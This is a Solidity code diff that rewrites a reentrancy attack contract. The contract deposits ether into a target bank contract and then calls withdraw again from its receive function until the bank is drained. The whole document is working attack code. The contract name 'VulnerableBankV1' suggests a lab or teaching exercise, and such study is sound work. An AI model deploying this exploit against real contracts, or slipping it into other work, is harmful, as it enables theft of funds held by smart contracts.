@@ -1,35 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.20;
 
-contract ReentrancyAttack {
-    address public target;
-    uint256 public amount = 1 ether;
+import "./VulnerableBankV1.sol";
 
-    constructor(address _target) {
-        target = _target;
+contract Attack {
+    VulnerableBankV1 public vulnerableBank;
+    uint256 public constant AMOUNT = 1 ether;
+
+    constructor(address _vulnerableBankAddress) {
+        vulnerableBank = VulnerableBankV1(_vulnerableBankAddress);
     }
 
-    // Fallback function to receive Ether during the reentrancy attack
-    receive() external payable {}
-
-    // Attack function to start the reentrancy attack
-    function attack() public payable {
-        require(msg.value == amount, "Incorrect ether amount");
-
-        // Deposit Ether into the target contract
-        (bool depositSuccess, ) = target.call{value: amount}(abi.encodeWithSignature("deposit()"));
-        require(depositSuccess, "Deposit failed");
-
-        // Trigger withdrawal in the target contract
-        (bool withdrawSuccess, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
-        require(withdrawSuccess, "Withdraw failed");
-    }
-
-    // Fallback function to handle reentrancy attack
-    fallback() external payable {
-        if (address(target).balance >= amount) {
-            (bool withdrawSuccess, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
-            require(withdrawSuccess, "Reentrant withdraw failed");
+    // Receive function is called when Ether is sent directly to this contract.
+    receive() external payable {
+        if (address(vulnerableBank).balance >= AMOUNT) {
+            vulnerableBank.withdraw(AMOUNT);  // Withdraw specific amount
         }
+    }
+
+    function attack() external payable {
+        require(msg.value >= AMOUNT, "Insufficient ETH sent for the attack");
+        vulnerableBank.deposit{value: AMOUNT}();
+        vulnerableBank.withdraw(AMOUNT);  // Start the withdrawal
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
